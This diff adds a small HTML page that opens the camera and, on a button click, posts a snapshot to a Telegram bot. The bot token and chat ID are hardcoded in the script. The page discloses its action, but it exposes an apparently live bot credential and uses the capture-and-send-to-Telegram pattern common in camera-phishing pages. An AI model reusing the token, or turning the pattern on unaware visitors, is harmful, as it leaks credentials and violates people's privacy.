@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Auto Capture & Send</title>
+<style>
+body {
+  font-family: sans-serif;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  min-height: 100vh;
+  background-color: #f0f0f0;
+}
+
+#container {
+  background-color: white;
+  border-radius: 10px;
+  padding: 20px;
+  box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+  text-align: center;
+}
+
+#camera-stream {
+  width: 320px;
+  height: 240px;
+  border: 1px solid #ccc;
+  margin-bottom: 10px;
+}
+
+button {
+  background-color: #007bff;
+  color: white;
+  padding: 10px 20px;
+  border: none;
+  border-radius: 5px;
+  cursor: pointer;
+  margin-top: 10px;
+}
+
+button:hover {
+  background-color: #0056b3;
+}
+
+#status {
+  margin-top: 20px;
+  font-weight: bold;
+}
+</style>
+</head>
+<body>
+
+<div id="container">
+  <h1>Auto Capture & Send</h1>
+  <video id="camera-stream" autoplay playsinline></video>
+  <canvas id="captured-image" style="display:none;"></canvas>
+  <button id="capture-button">Capture & Send</button>
+  <p id="status"></p>
+</div>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+  const video = document.getElementById('camera-stream');
+  const canvas = document.getElementById('captured-image');
+  const captureButton = document.getElementById('capture-button');
+  const status = document.getElementById('status');
+  const ctx = canvas.getContext('2d');
+
+  // Telegram Bot Credentials
+  const botToken = '8011320429:AAGozvscDyRHBQQRK_vOKlEYY3K8u_CDCwI';
+  const chatId = '7739144010';
+
+  async function startCamera() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      video.srcObject = stream;
+    } catch (err) {
+      console.error("Error accessing the camera:", err);
+      status.textContent = "Error: Camera access denied.";
+    }
+  }
+
+  function captureAndSend() {
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+    const imageDataURL = canvas.toDataURL('image/jpeg');
+    const blob = dataURLtoBlob(imageDataURL);
+    const formData = new FormData();
+    formData.append('chat_id', chatId);
+    formData.append('photo', blob, 'captured_image.jpg');
+
+    status.textContent = "Sending...";
+
+    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+      method: 'POST',
+      body: formData,
+    })
+    .then(response => response.json())
+    .then(data => {
+      if (data.ok) {
+        status.textContent = "Image sent successfully!";
+      } else {
+        console.error("Error sending image:", data);
+        status.textContent = "Error sending image.";
+      }
+    })
+    .catch(error => {
+      console.error("Network error:", error);
+      status.textContent = "Network error.";
+    });
+  }
+
+  function dataURLtoBlob(dataURL) {
+    const parts = dataURL.split(';base64,');
+    const contentType = parts[0].split(':')[1];
+    const raw = window.atob(parts[1]);
+    const rawLength = raw.length;
+    const uInt8Array = new Uint8Array(rawLength);
+
+    for (let i = 0; i < rawLength; ++i) {
+      uInt8Array[i] = raw.charCodeAt(i);
+    }
+
+    return new Blob([uInt8Array], { type: contentType });
+  }
+
+
+  captureButton.addEventListener('click', captureAndSend);
+  startCamera();
+});
+</script>
+
+</body>
+</html>
+```
